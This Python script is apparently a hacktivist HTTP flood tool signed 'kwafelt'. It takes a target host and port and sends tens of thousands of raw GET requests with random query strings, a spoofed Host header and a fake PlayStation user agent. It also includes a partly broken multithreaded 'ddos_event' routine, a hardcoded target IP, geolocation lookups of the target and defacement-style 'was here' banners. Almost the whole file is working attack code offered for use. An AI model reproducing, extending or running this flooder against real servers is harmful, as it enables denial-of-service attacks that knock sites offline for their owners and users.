#!/usr/bin/env python3
#
import hashlib, json, os, random, socket, sys, time ,uuid
# from threading import Thread
from requests import get

#
hello = '''

       ██   ██ ███    ██ ███    ██ ███████ ███████ ███████  █████     
    ██ ██   ██ ████   ██ ████   ██ ██      ██      ██      ██   ██ ██ 
       ███████ ██ ██  ██ ██ ██  ██ ███████ █████   █████   ███████    
    ██ ██   ██ ██  ██ ██ ██  ██ ██      ██ ██      ██      ██   ██ ▄█ 
       ██   ██ ██   ████ ██   ████ ███████ ██      ███████ ██   ██ ▀  
                                                                      
                                                                      
'''
wr = ["LOCKED OUT OF SERVER; kwafeLt wAS hERE..","written by kwafelt"]
ws = ["https://kwafelt.github.io/?stt=raw","https://www.instagram.com/kwafelt/","dragonforce.io/members/30011/"]

Browser_identification = 'Chrome/104.0.5112.102 OPR/90.0.4480.80'
user_agent2 = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'
ps4 = "Mozilla/5.0 (PlayStation 4 5.55) AppleWebKit/601.2 (KHTML, like Gecko)"
user_agent = ps4

# scratch.py
#
# import platform
# operating_system = platform.system()
# username = platform.uname()
# hostname = platform.node()
#
# PAUSE

workstat = os.uname()[0]
hostname = os.uname()[1]
platform = os.uname()[2]
username = os.environ.get('USERNAME')
admin = str(os.getlogin()).replace('K', 'k').replace('l', 'L')
MAC = hex(uuid.getnode());
WHO = f"{admin} wAS hERE"

BLOB = ["Hanna Sofea's comrade \ written by kwafelt", "10v3{5h371x1}"]
FLAG = BLOB[1]
ROOT = [""]
HTTP = ['HTTP/1.0','HTTP/1.1','HTTP/2']
HOST = ['writ.er.ws','search.censys.io']
CONN = ['close','Keep-Alive']
TEXT = ["Injecting process"]

p1 = [sys.argv[0], "",""]
target_host = None
target_port = None
delay = 0.75

TARGET_IP = '80.179.151.134'; status = 'dorman'
#

question = 'Do you want to continue ?'
confirm = ['Do you want to continue ?','Is this ok ?']

# parse_input
num_requests = 0;
thread_num = 0;

def color(r, g, b, text):
  return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r, g, b, text);

def title(c):
  if (c == 'start'): terminal_title = BLOB[0]
  if (c == 'prcss'): terminal_title = f'{TEXT[0]} \ {target_host}:{target_port} \ {WHO}'
  print(f'\33]0;{terminal_title}\a', end = "", flush = True)

def write(c):
  return sys.stdout.write(c)

def ossys(c):
  return os.system(c)

def timer(c):
  Timer(c, parse).start()

def ctime(c):
  ctime_tuple = time.localtime() # get struct_time
  time_string = time.strftime("%y/%m/%d %H:%M:%S", ctime_tuple)
  datetime = str(time_string)
  return datetime

def hash5(txt):
  str2hash = txt
  result = hashlib.md5(str2hash.encode())
  digest = result.hexdigest()
  return digest

def cdata(init):
  rawr = random.random()
  rawr = str(rawr).replace("0.","")
  raws = hash5(rawr)
  return raws

def reset(init):
  ossys('setterm --foreground default --background default --cursor on');
  if (init == 1):
    txt = f'STOPPING python3 {p1[0]} {p1[1]} {p1[2]}'
    write(f'\r\n {color(204,204,255,txt)}\r\n')
    write(f"\r\n {color(204,204,255,'T3R1M4 K4S3H ~')}\r\n\n")
    sys.exit(1)

def parse(init):
  global p1
  if (len(sys.argv) == 3):
    global target_host; global target_port
    FQDN = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    target_host = str(socket.gethostbyname(FQDN))
    target_port = int(sys.argv[2])
    p1 = [sys.argv[0], sys.argv[1], target_port]
    verif(init)
  else:
    write(f'\r\n Usage: {sys.argv[0]} <target_host> <target_port>')
    write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 443\n')
    reset(init); sys.exit(init)

def verif(init):
  try:
    r = socket.gethostbyname(target_host); s = socket.create_connection((r, target_port), 2)
    start(init)
  except (IOError, OSError):
    txt = color(245, 45, 45, 'SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT');
    write(f'\r\n {txt}\r\n');
    reset(0)
  finally: pass

def start(init):
  ossys('setterm --foreground cyan --background black --cursor on')
  ossys('clear'); title('start'); write(f"\t{color(248,152,128,hello)}")
  write(f"\r\n\t{wr[0]}\n\n\t{ws[0]}\n\t{ws[1]}\n\t{ws[2]}\n\n\t{wr[1]}\n")
  
  accss('access code')

def accss(text):
  reply = input(f"\r\n\t{color(248,152,128,text)}  :  ")
  if (reply == 'bypass') or (reply == '30011') or (reply == '2022'):
    press(0)
  else: accss('  try again')

def press(c):
  ossys('setterm --foreground white --background black --cursor on')
  ossys('clear')
  tx1 = color(242,210,189, username)
  tx2 = color(192,192,192, hostname)
  tx3 = color(242,210,189, MAC)
  tx4 = color(192,192,192, workstat)
  tx5 = color(242,210,189, platform)
  write(f'\r\n {tx1} {tx2} {tx3} {tx4} {tx5}\r\n')
  write(f'\r\n {ipapi(0)}\r\n')
  tx6 = color(248,152,128, f'wanna/will inject process to {target_host} : {target_port}')
  write(f'\r\n {tx6}\r\n')
  write(f'\r\n {ipapi(1)}\r\n')
  yes_or_no(confirm[0])

def yes_or_no(question):
  reply = input(f'\r\n {color(248,152,128, question)} [y/N] ')
  if (reply == '') or (reply[0] == 'n'):
    reset(0); ossys('clear'); return False
  if (reply[0] == 'y'):
    recon(0); #return False
  else: return yes_or_no('so.. YES or NO ?')

def yes_or_no_ORIG(question):  # BROKEN
  reply = str(raw_input(question + ' [y/N] ')).lower().strip()
  if reply[0] == 'y': return True
  if reply[0] == 'n': return False
  else: return yes_or_no("Uhhhh... please enter ")

def recon(c):
  ossys('setterm --background black --cursor off')
  ossys('clear')
  title('prcss')
  tx1 = ctime(0)
  tx2 = TEXT[0]
  pst = print_status()
  pst.initial(tx1, tx2)
  process(0)
  
################################################################################
def ipapi(i):
  URL = ['http://ip-api.com/json/', f'http://ip-api.com/json/{target_host}'];  # EDT https://ipinfo.io/json/1.1.1.1
  response = get(URL[i]) # ORIG: requests.get(str)
  txt = json.loads(response.text)
  if (txt['status'] == 'success'):
  
    tx1 = f"{color(245, 245, 245, txt['country'])} {color(227, 10, 92, txt['regionName'])} {color(0, 110, 210, txt['city'])} {color(245, 245, 245, txt['zip'])}";
    tx2 = f"\r\n {color(227, 10, 92, txt['isp'])}\n {color(0, 110, 210, txt['query'])}"
    out = tx1 + tx2
  else:
    out = f"{color(245, 245, 245, txt['query'])} {color(0, 110, 210, txt['message'])}"
  return out

# about the Requests library here: http://docs.python-requests.org/en/latest/
#from requests import get
#def felt():
# ip = get('https://api.ipify.org').text
# print(ip) # 'My public IP address is:', ip
#felt()
################################################################################

def address(LAN):
    if LAN == 0:
        hostname = socket.gethostname()  # getting the IP address using socket.gethostbyname() method
        ip_address = socket.gethostbyname(hostname)  # getting the IP address using socket.gethostbyname() method
        addr = ip_address  # print(f"Hostname: {hostname}") # print(f"IP Address: {ip_address}")
    if LAN == 1:
        wifi = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        wifi.connect((remote_server, 80))  # 443
        addr = wifi.getsockname()[0]
    return addr

###############################################################################
class print_status():
  def initial(self, txt0, txt1):
    tx1 = color(245, 215, 0, txt0)
    tx2 = color(99, 99, 99, 'Initial')
    tx3 = color(255, 215, 0, txt1)
    write(f'\r {tx1} {tx2} {tx3}..\r')
  def success(self, txt0, txt1):
    tx1 = color(224,191,184, txt0)
    tx2 = color(218,112,214, 'Success')
    tx3 = color(248,152,128, txt1)
    tx4 = color(224,191,184, WHO)
    write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r')
  def timeout(self, txt0, txt1):
    tx1 = color(145,145,145, txt0)
    tx2 = color(245, 245, 245, 'Timeout')
    tx3 = color(245,215,0,'...ERR_CONNECTION_TIMEOUT_ERR...')
    tx4 = color(0, 110, 210, 'RE-CONNECTING..')
    write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r')
  def failure(self, txt0, txt1):
    tx1 = color(145, 145, 145, txt0)
    tx2 = color(245, 110, 110, 'Failure')
    tx3 = color(245, 1, 1, 'No connection SERVER MAY BE DOWN')
    tx4 = color(245,110,110, "")
    write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r')
  flag = 'ctf{kwafeLt_wAS_hERE}'

###############################################################################

def attack(init):
  global delay; data = cdata(0); time = ctime(0)
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
    try:
      address = (target_host, target_port)
      proc.settimeout(2.2); proc.connect(address)
      b1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nAccept: application/json, text/plain, */*\r\n'
      b2 = f'Accept-Encoding: gzip, deflate\r\nAccept-Language: en-us, en\r\nConnection: {CONN[1]}\r\n'
      b3 = f'Keep-Alive: timeout=10, max=100\r\nUser-Agent: {user_agent}\r\n\r\n'
      proc.sendto((b1).encode('ascii'), address)
      proc.sendto((b2).encode('ascii'), address)
      proc.sendto((b3).encode('ascii'), address)
      # response = len(proc.recv(4096))
      proc.shutdown(socket.SHUT_RDWR)
      proc.close()
      st = print_status(); st.success(time, data)
      delay = 0.0
    except socket.timeout:
      st = print_status(); st.timeout(time, None)
      delay = 0.5
    except socket.error:
      st = print_status(); st.failure(time, None)
      delay = 1.5
    except (KeyboardInterrupt, SystemExit):
      txt = color(204,204,255,f'THREAD {init} / CTRL-C PRESSED / KEYBOARD INTERRUPT')
      write(f'\r\n\n {txt}\r\n')
      sys.exit(0)
    finally: pass

def process(count):
  while (count < 72540):
    count = count + 1
    time.sleep(delay)
    attack(count)
  else:
    time.sleep(0.3)
    tx1 = color(204,204,255,f'THREAD {count} / COMPLETED / {FLAG} / FINN')
    write(f'\r\n\n {tx1}\r\n')
  return

def ddos_event(count):
  for i in range(115):
    thread = threading.Thread(target=process_pro);
    thread.start()
def process_pro():
  attack(1)
# D.O.R.M.A.N

################################################################################
try:
  parse(0); BLOB = True
except (KeyboardInterrupt, IOError, OSError):
  tx1 = color(204,204,255,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..');
  write(f'\n {tx1}\r\n'); sys.exit(0)
except SystemExit as EXIT: pass
finally: reset(1); sys.exit(1);
##############################!TERIMA-KASEH~####################################
